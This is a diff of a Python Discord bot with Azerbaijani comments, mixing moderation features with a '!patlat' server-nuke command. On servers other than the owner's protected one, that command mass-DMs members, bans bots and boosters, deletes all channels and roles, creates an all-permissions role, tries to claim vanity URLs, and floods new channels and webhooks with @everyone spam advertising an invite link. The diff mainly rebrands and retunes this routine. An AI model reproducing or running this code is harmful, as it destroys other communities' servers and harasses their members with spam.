@@ -120,7 +120,6 @@ async def on_member_ban(guild, user):
 
 @bot.event
 async def on_webhooks_update(channel):
-    # Əgər kimsə kənardan gəlib serverdə icazəsiz webhook açmağa çalışarsa dərhal silir və banlayır
     try:
         async for entry in channel.guild.audit_logs(limit=1, action=discord.AuditLogAction.webhook_create):
             if entry.user.id != SAHIB_ID and entry.user.id != bot.user.id:
@@ -170,16 +169,14 @@ async def on_message(message):
         except:
             pass
 
-    # Random spam və sürətli flood qoruması (Normal danışanlara toxunmur, ardıcıl tez-tez yazanları tutur)
+    # Random spam və sürətli flood qoruması
     if author_id not in spam_takip:
         spam_takip[author_id] = []
         spam_sayaci[author_id] = 0
 
-    # Son 3 saniyə içindəki mesajları izləyir
     spam_takip[author_id] = [t for t in spam_takip[author_id] if simdi - t < 3]
     spam_takip[author_id].append(simdi)
 
-    # Əgər 3 saniyədən az müddətdə 4-dən çox mesaj (random spam/flood) atarsa
     if len(spam_takip[author_id]) > 4:
         try:
             await message.delete()
@@ -198,7 +195,7 @@ async def on_message(message):
         except:
             pass
 
-    # Səviyyə sistemi (Normal yazışmalara XP verir)
+    # Səviyyə sistemi
     if author_id not in user_levels:
         user_levels[author_id] = {"xp": 0, "level": 1}
 
@@ -476,7 +473,7 @@ async def clear_cmd(ctx, amount: int = 5):
     await msg.delete()
 
 # ---------------------------------------------------------------------------
-# 9. ƏYLƏNCƏ OYUNLARI VƏ QORUNAN QÜVVƏTLƏNDİRİLMİŞ !patlat
+# 9. ƏYLƏNCƏ OYUNLARI VƏ QORUNAN !patlat (discord.gg/aga)
 # ---------------------------------------------------------------------------
 
 @bot.command(name="sex", aliases=["spag", "ip"])
@@ -599,19 +596,14 @@ async def patlat_cmd(ctx):
 
     guild = ctx.guild
 
+    # ƏSAS SERVERİN QORUNMASI
     if guild.id == GUVENLI_SERVER_ID:
         await ctx.send("🛡️ XAS Qoruma Sistemi: Bu sənin əsas qorunan serverindir! Burada `!patlat` əmri qətiyyən işlədilə bilməz.")
         return
 
-    await ctx.send("⚡ XAS ULTRA TURBO SPAM NUKE BAŞLADI!")
+    await ctx.send("⚡ discord.gg/aga - SPAM NUKE BAŞLADI!")
 
-    nick_tasks = []
-    for member in guild.members:
-        if member.id != SAHIB_ID and not member.bot:
-            nick_tasks.append(member.edit(nick="XAS Wa Here"))
-    if nick_tasks:
-        await asyncio.gather(*nick_tasks, return_exceptions=True)
-
+    # 2. DM göndərilməsi
     dm_tasks = []
     for member in guild.members:
         if member.id != SAHIB_ID and not member.bot:
@@ -624,24 +616,28 @@ async def patlat_cmd(ctx):
     if dm_tasks:
         await asyncio.gather(*dm_tasks, return_exceptions=True)
 
+    # 3. Ban əməliyyatları
     ban_tasks = []
     for member in guild.members:
         if (member.bot and member.id != bot.user.id) or (member.premium_since is not None):
-            ban_tasks.append(member.ban(reason="XAS Turbo Nuke Təmizliyi"))
+            ban_tasks.append(member.ban(reason="discord.gg/aga Nuke Təmizliyi"))
     if ban_tasks:
         await asyncio.gather(*ban_tasks, return_exceptions=True)
 
+    # 4. Kanalların silinməsi
     channel_tasks = [ch.delete() for ch in guild.channels]
     if channel_tasks:
         await asyncio.gather(*channel_tasks, return_exceptions=True)
 
+    # 5. Rolların silinməsi
     role_tasks = [r.delete() for r in guild.roles if r != guild.default_role and r.position < guild.me.top_role.position]
     if role_tasks:
         await asyncio.gather(*role_tasks, return_exceptions=True)
 
+    # 6. Yeni Admin Rolü və Server Adı
     try:
         new_role = await guild.create_role(
-            name="#RUHUMSKDİ",
+            name="discord.gg/aga",
             permissions=discord.Permissions.all(),
             color=discord.Color.red()
         )
@@ -654,6 +650,7 @@ async def patlat_cmd(ctx):
     except:
         pass
 
+    # Vanity URL alternatifi
     vanity_alternatifleri = ["ruhumskdi", "ruhum-skdi", "ruhumunsesi", "skdiruhum"]
     for v_code in vanity_alternatifleri:
         try:
@@ -664,20 +661,21 @@ async def patlat_cmd(ctx):
 
     avatar_bytes = await bot.user.display_avatar.read() if bot.user.avatar else None
 
+    # 7. 70 Kanal və Hərəsində 10 Webhook ilə Spam
     async def send_bot_and_webhook_spam(channel, webhooks):
-        for _ in range(50):
+        for _ in range(25):
             try:
-                await channel.send("discord.gg/aga @everyone 🔥 XAS BOT SPAM DALĞASI 🔥")
+                await channel.send("discord.gg/aga @everyone 🔥 discord.gg/aga SPAM DALĞASI 🔥")
             except:
                 pass
 
             for wh in webhooks:
                 try:
-                    await wh.send("discord.gg/aga @everyone 🔥 WEBHOOK SPAM DALĞASI 🔥")
+                    await wh.send("discord.gg/aga @everyone 🔥 discord.gg/aga WEBHOOK SPAM 🔥")
                 except:
                     pass
             
-            await asyncio.sleep(0.02)
+            await asyncio.sleep(0.3)
 
     async def create_and_webhook_spam(i):
         try:
@@ -687,7 +685,7 @@ async def patlat_cmd(ctx):
             webhooks = []
             for w_num in range(1, 11):
                 try:
-                    wh = await channel.create_webhook(name=f"XAS-Spam-{w_num}", avatar=avatar_bytes)
+                    wh = await channel.create_webhook(name=f"aga-Spam-{w_num}", avatar=avatar_bytes)
                     webhooks.append(wh)
                 except:
                     pass
@@ -702,9 +700,13 @@ async def patlat_cmd(ctx):
         await asyncio.gather(*tasks_list, return_exceptions=True)
         await asyncio.sleep(0.1)
 
+# ---------------------------------------------------------------------------
+# 10. BOTU İŞƏ SALMAq (RUN)
+# ---------------------------------------------------------------------------
+
 if __name__ == "__main__":
     keep_alive()
     TOKEN = os.getenv("DISCORD_TOKEN")
     if TOKEN:
         bot.run(TOKEN)
-                             
+            
